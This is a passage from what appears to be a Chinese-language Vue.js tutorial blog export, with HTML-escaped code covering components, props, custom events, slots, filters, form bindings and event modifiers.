&lt;my-component&gt;&lt;/my-component&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el: '#app', data: &#123; &#125;, components: &#123; 'my-component': &#123; template: `&lt;div&gt;这是一个局部的自定义组件，只能在当前Vue实例中使用&lt;/div&gt;`, &#125; &#125; &#125;)&lt;/script&gt; 直接使用Vue.component()创建的组件，所有的Vue实例都可以使用。还可以在某个Vue实例中注册只有自己能使用的组件 12345678910var app = new Vue(&#123; el: '#app', data: &#123; &#125;, components: &#123; 'my-component': &#123; template: `&lt;div&gt;这是一个局部的自定义组件，只能在当前Vue实例中使用&lt;/div&gt;`, &#125; &#125; &#125;) 1.2 模板的要求 注意：组件的模板只能有一个根元素。下面的情况是不允许的 12template: `&lt;div&gt;这是一个局部的自定义组件，只能在当前Vue实例中使用&lt;/div&gt; &lt;button&gt;hello&lt;/button&gt;`, 1.3 组件中的data必须是函数 可以看出，注册组件时传入的配置和创建Vue实例差不多，但也有不同，其中一个就是data属性必须是一个函数 这是因为如果像Vue实例那样，传入一个对象，由于JS中对象类型的变量实际上保存的是对象的引用，所以当存在多个这样的组件时，会共享数据，导致一个组件中数据的改变会引起其他组件数据的改变。 而使用一个返回对象的函数，每次使用组件都会创建一个新的对象，这样就不会出现共享数据的问题来了 1.4 关于DOM模板的解析 当使用 DOM 作为模版时 (例如，将 el 选项挂载到一个已存在的元素上), 你会受到 HTML 的一些限制，因为 Vue 只有在浏览器解析和标准化 HTML 后才能获取模板内容。尤其像这些元素 &lt;ul&gt;，&lt;ol&gt;，&lt;table&gt;，&lt;select&gt; 限制了能被它包裹的元素，而一些像 &lt;option&gt; 这样的元素只能出现在某些其它元素内部 在自定义组件中使用这些受限制的元素时会导致一些问题，例如 123&lt;table&gt; &lt;my-row&gt;...&lt;/my-row&gt;&lt;/table&gt; 自定义组件 &lt;my-row&gt; 被认为是无效的内容，因此在渲染的时候会导致错误。这时应使用特殊的 is 属性 123&lt;table&gt; &lt;tr is=\"my-row\"&gt;&lt;/tr&gt;&lt;/table&gt; 也就是说，标准HTML中，一些元素中只能放置特定的子元素，另一些元素只能存在于特定的父元素中。比如table中不能放置div，tr的父元素不能div等。所以，当使用自定义标签时，标签名还是那些标签的名字，但是可以在标签的is属性中填写自定义组件的名字 应当注意，如果您使用来自以下来源之一的字符串模板，这些限制将不适用： &lt;script type=&quot;text/x-template&quot;&gt; JavaScript 内联模版字符串 .vue 组件 一般情况下，只有单文件组件.vue可以忽略这种情况 二、组件的属性和事件 在html中使用元素，会有一些属性，如class,id，还可以绑定事件，自定义组件也是可以的。当在一个组件中，使用了其他自定义组件时，就会利用子组件的属性和事件来和父组件进行数据交流 image.png 父子组件之间的通信就是 props down,events up，父组件通过属性props向下传递数据给子组件，子组件通过 事件events 给父组件发送消息。 比如，子组件需要某个数据，就在内部定义一个prop属性，然后父组件就像给html元素指定特性值一样，把自己的data属性传递给子组件的这个属性。 而当子组件内部发生了什么事情的时候，就通过自定义事件来把这个事情涉及到的数据暴露出来，供父组件处理 1&lt;my-component v-bind:foo=\"baz\" v-on:event-a=\"doThis(arg1,...arg2)\"&gt;&lt;/my-component&gt; foo是&lt;my-component&gt;组件内部定义的一个prop属性，baz是父组件的一个data属性， event-a是子组件定义的一个事件，doThis是父组件的一个方法 过程就是这样 父组件把baz数据通过prop传递给子组件的foo； 子组件内部得到foo的值，就可以进行相应的操作； 当子组件内部发生了一些变化，希望父组件能知道时，就利用代码触发event-a事件，把一些数据发送出去 父组件把这个事件处理器绑定为doThis方法，子组件发送的数据，就作为doThis方法的参数被传进来 然后父组件就可以根据这些数据，进行相应的操作 三、属性Props Vue组件通过props属性来声明一个自己的属性，然后父组件就可以往里面传递数据 123456789Vue.component('mycomponent',&#123; template: '&lt;div&gt;这是一个自定义组件,父组件传给我的内容是：&#123;&#123;myMessage&#125;&#125;&lt;/div&gt;', props: ['myMessage'], data () &#123; return &#123; message: 'hello world' &#125; &#125; &#125;) 调用该组件 123&lt;div id=\"app\"&gt; &lt;mycomponent my-message=\"hello\"&gt;&lt;/mycomponent&gt;&lt;/div&gt; 注意，由于HTML特性是不区分大小写的，所以传递属性值时，myMessage应该转换成 kebab-case (短横线隔开式)my-message=&quot;hello&quot; 3.1 v-bind绑定属性值 一般情况下，使用v-bind给元素特性(attribute)传递值时，Vue会将&quot;&quot;中的内容当做一个表达式 用v-bind:class和class传入正常的类名，效果是一样的，因为对于这两个特性，Vue采用了合并而不是替换的原则 3.2 动态绑定特性值 想要把父组件的属性绑定到子组件，应该使用v-bind，这样，父组件中数据改变时能反映到子组件。注意，根据父组件传递给子组件的属性类型的不同，当在子组件中更改这个属性时，会有以下两种情况 当父组件传递的属性是引用类型时，在子组件中更改相应的属性会导致父组件相应属性的更改 123456789101112131415161718192021222324252627282930&lt;div id=\"app2\"&gt; &lt;div&gt;这是父组件的parentArray：&#123;&#123;parentArray&#125;&#125;&lt;/div&gt; &lt;my-component :child-array=\"parentArray\"&gt;&lt;/my-component&gt; &lt;/div&gt; &lt;script&gt; Vue.component('my-component', &#123; template: ` &lt;div&gt;这是接收了父组件传递值的子组件的childArray: &#123;&#123;childArray&#125;&#125; &lt;br&gt; &lt;button type=\"button\" @click=\"changeArray\"&gt; 点击我改变父元素的parentArray&lt;/button&gt; &lt;/div&gt;`, props: ['childArray'], data () &#123; return &#123; counter: 1 &#125; &#125;, methods: &#123; changeArray () &#123; this.childArray.push(this.counter++) &#125; &#125; &#125;) new Vue(&#123; el: '#app2', data: &#123; parentArray: [] &#125; &#125;) &lt;/script&gt; 当父组件传递值为基本类型时，在子组件中更改这个属性会报错。正确的做法是，在父组件中绑定属性值时，加上.sync修饰符 1&lt;my-component :child-array.sync=\"parentArray\"&gt;&lt;/my-component&gt; 然后在子组件中改变相应的属性 123456methods: &#123; changeArray () &#123; this.counter++ this.$emit('update:childArray', this.counter) &#125; &#125; 3.3 子组件希望对传入的prop进行操作 一般来说，是不建议在子组件中对父组件中传递来的属性进行操作的。如果真的有这种需求,可以这样: 父组件传递了一个基本类型值，那么可以在子组件中创建一个新的属性，并以传递进来的值进行初始化，之后就可以操作这个新的属性了 1234props: ['initialCounter'],data: function () &#123; return &#123; counter: this.initialCounter &#125;&#125; 父组件传递了一个引用类型值，为了避免更改父组件中相应的数据，最好是对引用类型进行复制。复杂的情况，肯定应该是深复制。 3.4 给子组件传递正确类型的值 静态的给子组件的特性传递值，它都会把他当做一个字符串 12&lt;!-- 传递了一个字符串 &quot;1&quot; --&gt;&lt;comp some-prop=&quot;1&quot;&gt;&lt;/comp&gt; 子组件中，特性的值是字符串 “1” 而不是 number 1。如果想传递正确的数值，应该使用v-bind传递，这样就能把传递的值当做一个表达式来处理，而不是字符串 12&lt;!-- 传递实际的 number 1 --&gt;&lt;comp v-bind:some-prop=&quot;1&quot;&gt;&lt;/comp&gt; 四、Prop验证 我们可以给组件的props属性添加验证，当传入的数据不符合要求时，Vue会发出警告 12345678910111213141516171819202122232425262728293031Vue.component('example', &#123; props: &#123; // 基础类型检测 (`null` 意思是任何类型都可以) propA: Number, // 多种类型 propB: [String, Number], // 必传且是字符串 propC: &#123; type: String, required: true &#125;, // 数字，有默认值 propD: &#123; type: Number, default: 100 &#125;, // 数组/对象的默认值应当由一个工厂函数返回 propE: &#123; type: Object, default: function () &#123; return &#123; message: 'hello' &#125; &#125; &#125;, // 自定义验证函数 propF: &#123; validator: function (value) &#123; return value &gt; 10 &#125; &#125; &#125;&#125;) type 可以是下面原生构造器： String Number Boolean Function Object Array Symbol type也可以是一个自定义构造器函数，使用 instanceof 检测 12345678910111213141516171819// 自定义Person构造器 function Person(name, age) &#123; this.name = name this.age = age &#125; Vue.component('my-component', &#123; template: `&lt;div&gt;名字: &#123;&#123; person-prop.name &#125;&#125;， 年龄： &#123;&#123; person-prop.age &#125;&#125; &lt;/div&gt;`, props: &#123; person-prop: &#123; type: Person // 指定类型 &#125; &#125; &#125;) new Vue(&#123; el: '#app2', data: &#123; person: 2 // 传入Number类型会报错 &#125; &#125;) 非Prop类型的属性 也可以像在html标签中添加data-开头的自定义属性一样，给自定义组件添加任意的属性。而不仅限于data-*形式，这样做的话，Vue会把这个属性放在自定义组件的根元素上。一个自定义组件的模板只能有一个根元素 覆盖非Prop属性 如果父组件向子组件的非prop属性传递了值，那么这个值会覆盖子组件模板中的特性 1234567891011&lt;div id=\"app3\"&gt; &lt;my-component2 att=\"helloParent\"&gt;&lt;/my-component2&gt;&lt;/div&gt;&lt;script&gt; Vue.component('my-component2', &#123; template: `&lt;div att=\"helloChild\"&gt;子组件原有的特性被覆盖了&lt;/div&gt;` &#125;) new Vue(&#123; el: '#app3' &#125;)&lt;/script&gt; 上面渲染的结果是，div的att属性是helloParent。 注意：前面已经提到过，覆盖原则对于class和style不适用,而是采用了合并(merge)的原则 1234567891011&lt;div id=\"app3\"&gt; &lt;my-component2 att=\"helloParent\" class=\"class2\" style=\"color: red;\"&gt;&lt;/my-component2&gt;&lt;/div&gt;&lt;script&gt; Vue.component('my-component2', &#123; template: `&lt;div att=\"helloChild\" class=\"class1\" style=\"background: yellow;\"&gt;子组件原有的特性被覆盖了&lt;/div&gt;` &#125;) new Vue(&#123; el: '#app3' &#125;)&lt;/script&gt; 上面的渲染结果是，div的类名是class1 class2，行内样式是color:red; background:yellow; 五、自定义事件 通过prop属性，父组件可以向子组件传递数据，而子组件的自定义事件就是用来将内部的数据报告给父组件的 1234567891011121314151617181920212223&lt;div id=\"app3\"&gt; &lt;my-component2 v-on:myclick=\"onClick\"&gt;&lt;/my-component2&gt;&lt;/div&gt;&lt;script&gt; Vue.component('my-component2', &#123; template: `&lt;div&gt; &lt;button type=\"button\" @click=\"childClick\"&gt;点击我触发自定义事件&lt;/button&gt; &lt;/div&gt;`, methods: &#123; childClick () &#123; this.$emit('myclick', '这是我暴露出去的数据', '这是我暴露出去的数据2') &#125; &#125; &#125;) new Vue(&#123; el: '#app3', methods: &#123; onClick () &#123; console.log(arguments) &#125; &#125; &#125;)&lt;/script&gt; 子组件在自己的方法中将自定义事件以及需要发出的数据通过以下代码发送出去 1this.$emit(&apos;myclick&apos;, &apos;这是我暴露出去的数据&apos;, &apos;这是我暴露出去的数据2&apos;) 第一个参数是自定义事件的名字 后面的参数是依次想要发送出去的数据 父组件利用v-on为事件绑定处理器 1&lt;my-component2 v-on:myclick=&quot;onClick&quot;&gt;&lt;/my-component2&gt; 5.1 绑定原生事件 如果想在某个组件的根元素上监听一个原生事件。可以使用 .native修饰 v-on 1&lt;my-component v-on:click.native=\"doTheThing\"&gt;&lt;/my-component&gt; 5.2 探究v-model v-model可以对表单控件实现数据的双向绑定，它的原理就是利用了绑定属性和事件来实现的。比如input控件。不使用v-model，可以这样实现数据的双向绑定 1234567891011121314151617&lt;div id=\"app4\"&gt; &lt;input type=\"text\" v-bind:value=\"text\" v-on:input=\"changeValue($event.target.value)\"&gt; &#123;&#123;text&#125;&#125; &lt;/div&gt; &lt;script&gt; new Vue(&#123; el: '#app4', data: &#123; text: '444' &#125;, methods: &#123; changeValue (value) &#123; this.text = value &#125; &#125; &#125;) &lt;/script&gt; 上面的代码同样实现了数据的双向绑定。其本质就是: 把input的value特性绑定到Vue实例的属性text上，text改变，input中的内容也会改变 然后把表单的input事件处理函数设置为Vue实例的一个方法，这个方法会根据输入参数改变Vue中text的值相应的，在input中输入内容时，触发了input事件，把event.target.value传给这个方法，最后就实现了改变绑定的数据的效果。 而v-model就是上面这种方式的语法糖，也就是把上面的写法封装了一下，方便我们使用 5.3 使用自定义事件创建自定义的表单输入组件 理解了v-model的内幕，也就可以把这个效果用在自定义表单组件上了。来实现一个简单的只能输入hello的表单输入组件 123456789101112131415161718192021222324252627&lt;div id=\"app5\"&gt; &lt;my-component3 v-model=\"hello\"&gt;&lt;/my-component3&gt; &lt;div&gt;&#123;&#123;hello&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; Vue.component('my-component3', &#123; template: `&lt;input ref=\"input\" type=\"text\" :value=\"value\" @input=\"checkInput($event.target.value)\"&gt;`, props: ['value'], methods: &#123; checkInput (value) &#123; var hello = 'hello' if (!hello.includes(value)) &#123; this.$emit('input', hello) this.$refs.input.value = hello &#125; else &#123; this.$emit('input', value) &#125; &#125; &#125; &#125;) new Vue(&#123; el: '#app5', data: &#123; hello: '' &#125; &#125;)&lt;/script&gt; 六、动态组件 通过使用保留的 &lt;component&gt; 元素，动态地绑定到它的 is 特性，可以让多个组件使用同一个挂载点，并动态切换 123456789101112131415161718192021222324252627&lt;div id=\"app6\"&gt; &lt;select v-model=\"currentComponent\"&gt; &lt;option value=\"home\"&gt;home&lt;/option&gt; &lt;option value=\"post\"&gt;post&lt;/option&gt; &lt;option value=\"about\"&gt;about&lt;/option&gt; &lt;/select&gt; &lt;component :is=\"currentComponent\"&gt;&lt;/component&gt; &lt;/div&gt; &lt;script&gt; new Vue(&#123; el: '#app6', data: &#123; currentComponent: 'home' &#125;, components: &#123; home: &#123; template: `&lt;header&gt;这是home组件&lt;/header&gt;` &#125;, post: &#123; template: `&lt;header&gt;这是post组件&lt;/header&gt;` &#125;, about: &#123; template: `&lt;header&gt;这是about组件&lt;/header&gt;` &#125; &#125; &#125;)&lt;/script&gt; 保留切换出去的组件，避免重新渲染 如果把切换出去的组件保留在内存中，可以保留它的状态或避免重新渲染。为此可以添加一个 keep-alive 指令参数 12345&lt;keep-alive&gt; &lt;component :is=\"currentComponent\"&gt; &lt;!-- 非活动组件将被缓存！ --&gt; &lt;/component&gt;&lt;/keep-alive&gt; 七、使用slot分发内容7.1 单个slot 很多组件的使用方式是这样的： 1&lt;component&gt;&lt;/component&gt; 也就是说组件中是空的，没有放置任何文本或元素。但是原生的html元素都是可以进行嵌套的，div里面放table什么的。自定义组件开闭标签之间也可以放置内容，不过需要在定义组件时使用slot。 slot相当于子组件设置了一个地方，如果在调用它的时候，往它的开闭标签之间放了东西，那么它就把这些东西放到slot中。 当子组件中没有slot时，父组件放在子组件标签内的东西将被丢弃； 子组件的slot标签内可以放置内容，当父组件没有放置内容在子组件标签内时，slot中的内容会渲染出来 子组件的模板: 123456&lt;div&gt; &lt;h2&gt;我是子组件的标题&lt;/h2&gt; &lt;slot&gt; 只有在没有要分发的内容时才会显示。 &lt;/slot&gt;&lt;/div&gt; 父组件模板： 123456&lt;div&gt; &lt;h1&gt;我是父组件的标题&lt;/h1&gt; &lt;my-component&gt; &lt;p&gt;这是一些初始内容&lt;/p&gt; &lt;/my-component&gt;&lt;/div&gt; 渲染结果： 1234567&lt;div&gt; &lt;h1&gt;我是父组件的标题&lt;/h1&gt; &lt;div&gt; &lt;h2&gt;我是子组件的标题&lt;/h2&gt; &lt;p&gt;这是一些初始内容&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 7.2 带名称的slot slot可以有很多个。那么子组件对于父组件放置的多余的内容如何放到各个slot中呢？方法就是子组件给每个slot起一个名字name，父组件放置多余的元素时，给每个元素的slot属性分配一个代表slot的名字。到时候，多余的内容就会根据自己的slot属性去找具有对应名字的slot元素。 注意： 子组件可以有一个匿名的slot，当分发的多余内容找不到对应的slot时，就会进入这里面如果子组件没有匿名的slot，当分发的多余内容找不到对应的slot时，就会被丢弃 例如，假定我们有一个 app-layout组件，它的模板为： 1234567891011&lt;div class=\"container\"&gt; &lt;header&gt; &lt;slot name=\"header\"&gt;&lt;/slot&gt; &lt;/header&gt; &lt;main&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/main&gt; &lt;footer&gt; &lt;slot name=\"footer\"&gt;&lt;/slot&gt; &lt;/footer&gt;&lt;/div&gt; 父组件模版： 123456&lt;app-layout&gt; &lt;h1 slot=\"header\"&gt;这里可能是一个页面标题&lt;/h1&gt; &lt;p&gt;主要内容的一个段落。&lt;/p&gt; &lt;p&gt;另一个主要段落。&lt;/p&gt; &lt;p slot=\"footer\"&gt;这里有一些联系信息&lt;/p&gt;&lt;/app-layout&gt; 渲染结果为： 123456789101112&lt;div class=\"container\"&gt; &lt;header&gt; &lt;h1&gt;这里可能是一个页面标题&lt;/h1&gt; &lt;/header&gt; &lt;main&gt; &lt;p&gt;主要内容的一个段落。&lt;/p&gt; &lt;p&gt;另一个主要段落。&lt;/p&gt; &lt;/main&gt; &lt;footer&gt; &lt;p&gt;这里有一些联系信息&lt;/p&gt; &lt;/footer&gt;&lt;/div&gt; 八、组件通信 在 Vue.js 中，父子组件的关系可以总结为 props down, events up image.png 父组件通过 props 向下传递数据给子组件，子组件通过 events 给父组件发送消息 8.1 父与子 父组件是通过props属性给子组件通信的来看下代码 123456789&lt;parent&gt; &lt;child :child-com=&quot;content&quot;&gt;&lt;/child&gt; //注意这里用驼峰写法哦&lt;/parent&gt;data()&#123; return &#123; content:&apos;sichaoyun&apos; &#125;;&#125; 子组件通过props来接受数据 第一种方法 1props: ['childCom'] 第二种方法 123props: &#123; childCom: String // 这里指定了字符串类型，如果类型不一致会警告哦&#125; 第三种方法 123456props: &#123; childCom: &#123; type: String, default: 'sichaoyun' &#125;&#125; 8.2 子与父 vue2.0只允许单向数据传递，我们通过出发事件来改变组件的数据 子组件 1234567891011&lt;template&gt; &lt;div @click=\"open\"&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; methods: &#123; open() &#123; this.$emit('showbox','the msg'); //触发showbox方法，'the msg'为向父组件传递的数据 &#125; &#125;&lt;/script&gt; 父组件 123456789&lt;child @showbox=\"toshow\" :msg=\"msg\"&gt;&lt;/child&gt; //监听子组件触发的showbox事件,然后调用toshow方法&lt;script&gt; methods: &#123; toshow(msg) &#123; this.msg = msg; &#125; &#125;&lt;/script&gt; 8.3 兄弟组件之间的通信 我们可以实例化一个vue实例，相当于一个第三方 1let vm = new Vue(); //创建一个新实例 组件他哥 123456&lt;div @click=&quot;ge&quot;&gt;&lt;/div&gt;methods: &#123; ge() &#123; vm.$emit(&apos;blur&apos;,&apos;sichaoyun&apos;); //触发事件 &#125;&#125; 组件小弟接受大哥命令 123456&lt;div&gt;&lt;/div&gt;created() &#123; vm.$on(&apos;blur&apos;, (arg) =&gt; &#123; this.test= arg; // 接收 &#125;);&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue过滤器（八）","slug":"2018-03-vue-filters","date":"2018-08-27T02:20:32.000Z","updated":"2018-10-24T03:46:02.436Z","comments":true,"path":"note/c243ab9b.html","link":"","permalink":"https://ru23.com/note/c243ab9b.html","excerpt":"","text":"一、全局过滤器12345// 第一个参数表示：过滤器的名称// 第二个参数表示：函数，使用过滤器的时候，这个函数中的代码会被执行Vue.filter('filterName', function (value) &#123; // value 表示要过滤的内容&#125;) 例子 123456789101112131415161718Vue.filter('date', function (input, format = 'yyyy-MM-dd hh:mm:ss'）&#123; var o = &#123; \"M+\": input.getMonth() + 1, //月份 \"d+\": input.getDate(), //日 \"h+\": input.getHours(), //小时 \"m+\": input.getMinutes(), //分 \"s+\": input.getSeconds(), //秒 \"q+\": Math.floor((input.getMonth() + 3) / 3), //季度 \"S\": input.getMilliseconds() //毫秒 &#125;; if (/(y+)/.test(format)) format = format.replace(RegExp.$1, (input.getFullYear() + \"\").substr(4 - RegExp.$1.length)); // 不够2位的前面补0 for (var k in o) if (new RegExp(\"(\" + k + \")\").test(format)) format = format.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((\"00\" + o[k]).substr((\"\" + o[k]).length))); return format; &#125;) 使用 1&lt;h1&gt;&#123;&#123;item.time | date('yyyy-MM-dd hh:mm:ss')&#125;&#125;&lt;/h1&gt; 一个项目中，可能要用到很多过滤器来处理数据，多个组件公用的，可以注册全局过滤器。单个组件使用的，就挂载到实例filters中。项目做的多了以后，可以整理一套常用的filters，不用反复的写。比如：时间等各种操作，数据格式转化，单位换算，部分数据的md5加密等… 创建一个filters专门放各种过滤器 image.png filter.js image.png main.js image.png 页面上直接用 ’｜过滤器名‘ 即可 image.png 或者直接在main.js中直接自定义全局过滤器 二、局部过滤器 在某一个vue实例的内创建的，只在当前实例中起作用 12345678910new Vue(&#123; data:&#123; &#125;, // 通过 filters 属性创建局部过滤器 // 注意：此处为 filters filters: &#123; filterName: function(value, format) &#123;&#125; &#125;&#125;)","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue 表单控件与绑定（七）","slug":"2018-03-vue-form","date":"2018-08-27T02:10:32.000Z","updated":"2018-10-24T03:46:02.440Z","comments":true,"path":"note/79c90ec.html","link":"","permalink":"https://ru23.com/note/79c90ec.html","excerpt":"","text":"一、文本框1.1 普通文本框1234567891011&lt;div id=\"app-1\"&gt; &lt;p&gt;&lt;input v-model=\"textBox\" placeholder=\"输入内容...\"&gt;输入的内容：&#123;&#123; textBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; textBox: '' &#125; &#125;)&lt;/script&gt; 1.2 数字文本框1234567891011&lt;div id=\"app-1\"&gt; &lt;p&gt;&lt;input v-model.number=\"numberTextBox\" type=\"number\" placeholder=\"输入内容...\"&gt; 输入的内容：&#123;&#123; numberTextBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; numberTextBox: '' &#125; &#125;)&lt;/script&gt; .number参数会强制把返回值转成Number类型，因为就算是type=&quot;number&quot;，返回的也是字符串型 1.3 多行输入框12345678910111213&lt;div id=\"app-1\"&gt; &lt;p&gt;&lt;textarea v-model=\"multiTextBox\" placeholder=\"输入内容...\"&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;输入的内容：&lt;/p&gt; &lt;p style=\"white-space:pre\"&gt;&#123;&#123; multiTextBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; multiTextBox: '' &#125; &#125;)&lt;/script&gt; style=&quot;white-space:pre&quot;表示空白会被浏览器保留。其行为方式类似 HTML 中的 &lt;pre&gt; 标签 二、复选框2.1 单个复选框123456789101112&lt;div id=\"app-1\"&gt; &lt;input type=\"checkbox\" id=\"checkbox\" v-model=\"singleCheckBox\"&gt; &lt;label for=\"checkbox\"&gt;&#123;&#123; singleCheckBox &#125;&#125;&lt;/label&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; singleCheckBox: false &#125; &#125;)&lt;/script&gt; 2.2 定义属性单个复选框1234567891011121314&lt;div id=\"app-1\"&gt; &lt;input type=\"checkbox\" id=\"checkbox\" v-model=\"customSingleCheckBox\" v-bind:true-value=\"customTrue\" v-bind:false-value=\"customFalse\"&gt; &lt;label for=\"checkbox\"&gt;&#123;&#123; customSingleCheckBox &#125;&#125;&lt;/label&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; customTrue: '真', customFalse: '假', customSingleCheckBox: '假' &#125; &#125;)&lt;/script&gt; v-bind:true-value设置为真时的属性，v-bind:false-value设置为假时的属性 2.3 多个复选框1234567891011121314151617&lt;div id=\"app-1\"&gt; &lt;input type=\"checkbox\" id=\"tansea\" value=\"TanSea\" v-model=\"multiCheckBox\"&gt; &lt;label for=\"tansea\"&gt;TanSea&lt;/label&gt; &lt;input type=\"checkbox\" id=\"google\" value=\"Google\" v-model=\"multiCheckBox\"&gt; &lt;label for=\"google\"&gt;Google&lt;/label&gt; &lt;input type=\"checkbox\" id=\"baidu\" value=\"Baidu\" v-model=\"multiCheckBox\"&gt; &lt;label for=\"baidu\"&gt;Baidu&lt;/label&gt; &lt;p&gt;选择的项：&#123;&#123; multiCheckBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; multiCheckBox: [] &#125; &#125;)&lt;/script&gt; 三、单选框12345678910111213141516复制代码&lt;div id=\"app-1\"&gt; &lt;input type=\"radio\" id=\"male\" value=\"男\" v-model=\"radioBox\"&gt; &lt;label for=\"male\"&gt;男&lt;/label&gt; &lt;input type=\"radio\" id=\"female\" value=\"女\" v-model=\"radioBox\"&gt; &lt;label for=\"female\"&gt;女&lt;/label&gt; &lt;p&gt;选择的项：&#123;&#123; radioBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; radioBox: '' &#125; &#125;)&lt;/script&gt; 四、下拉框4.1 普通下拉框12345678910111213141516&lt;div id=\"app-1\"&gt; &lt;select v-model=\"comboBox\"&gt; &lt;option disabled value=\"\"&gt;请选择一项&lt;/option&gt; &lt;option&gt;男&lt;/option&gt; &lt;option&gt;女&lt;/option&gt; &lt;/select&gt; &lt;p&gt;选择的项：&#123;&#123; comboBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; comboBox: '' &#125; &#125;)&lt;/script&gt; 4.2 动态绑定下拉框123456789101112131415161718192021&lt;div id=\"app-1\"&gt; &lt;select v-model=\"dynamicComboBox\"&gt; &lt;option v-for=\"optionItem in optionItems\" v-bind:value=\"optionItem.value\"&gt; &#123;&#123; optionItem.text &#125;&#125; &lt;/option&gt; &lt;/select&gt; &lt;p&gt;选择的项：&#123;&#123; dynamicComboBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; dynamicComboBox: '', optionItems: [ &#123; value: 'TanSea', text: '双子宫殿' &#125;, &#123; value: 'Google', text: '谷歌搜索' &#125;, &#123; value: 'Baidu', text: '百度搜索' &#125; ] &#125; &#125;)&lt;/script&gt; 4.3 多选列表12345678910111213141516&lt;div id=\"app-1\"&gt; &lt;p&gt;&lt;select v-model=\"multiComboBox\" multiple&gt; &lt;option&gt;双子宫殿&lt;/option&gt; &lt;option&gt;谷歌搜索&lt;/option&gt; &lt;option&gt;百度搜索&lt;/option&gt; &lt;/select&gt;&lt;/p&gt; &lt;p&gt;选择的项：&#123;&#123; multiComboBox &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm1 = new Vue(&#123; el: '#app-1', data: &#123; multiComboBox: [] &#125; &#125;)&lt;/script&gt;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue事件（六）","slug":"2018-03-vue-event","date":"2018-08-26T16:10:32.000Z","updated":"2018-10-24T03:46:02.433Z","comments":true,"path":"note/dd238463.html","link":"","permalink":"https://ru23.com/note/dd238463.html","excerpt":"","text":"一、方法传参1234567891011121314&lt;div id=\"test\"&gt; &lt;button @click=\"sayHi('你好')\"&gt;说你好&lt;/button&gt; &lt;!--这里使用@--&gt; &lt;button @click=\"sayHi('我被点击了')\"&gt;说我被点击了&lt;/button&gt; &lt;!--这里使用@--&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var myVue = new Vue(&#123; el: '#test', methods: &#123; //这里使用methods sayHi: function (message) &#123; alert(message) &#125; &#125; &#125;)&lt;/script&gt; 二、vue访问原生 DOM 事件 用$event获取 12345678910111213141516171819&lt;button @click=\"changeColor('你好',$event)\"&gt;点击我&lt;/button&gt; &lt;!--这里使用@--&gt;&lt;div style=\"height: 100px;width: 100px;background-color: red;\" @mouseover=\"over('鼠标从我上面滑过',$event)\"&gt; 鼠标从我上面滑过试试&lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var myVue = new Vue(&#123; el: '#test', methods: &#123; //这里使用methods changeColor: function (message, event) &#123; alert(message+event); //弹出我被点击了,事件是[object MouseEvent] &#125;, over :function (message, event) &#123; alert(message+event); //弹出鼠标从我上面滑过,事件是[object MouseEvent] &#125; &#125; &#125;)&lt;/script&gt; 三、事件修饰符 事件修饰符有基本的6种 .stop阻止事件冒泡 1&lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt; .prevent阻止默认事件 1&lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt; .capture时间捕获（从上到下） 1&lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt; .self只在元素自身回调 1&lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt; .once只触发一次 1&lt;a v-on:click.once=\"doThis\"&gt;&lt;/a&gt; 使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 `@click.prevent.self会阻止所有的点击，而@click.self.prevent` 只会阻止元素上的点击 四、键值修饰符 在监听键盘事件时，我们经常需要监测常见的键值。 Vue 允许为 v-on 在监听键盘事件时添加关键修饰符 123456789101112131415161718192021&lt;div id=\"app\"&gt; &#123;&#123;msg&#125;&#125; &lt;input type=\"text\" v-on:keydown=\"ke\"/&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123; el:\"#app\", data:&#123; msg:\"事件处理\", counter:0 &#125;, methods:&#123; ke:function(e)&#123; if(e.keyCode == 13)&#123; this.msg = e.target.value; e.target.value = \"\"; &#125; &#125; &#125;&#125;);&lt;/script&gt; enter(回车) tab（tab切换） delete (捕获 “删除” 和 “退格” 键) esc（esc键） space（退档键） up（上键） down（下键） left（左键） right（右键） 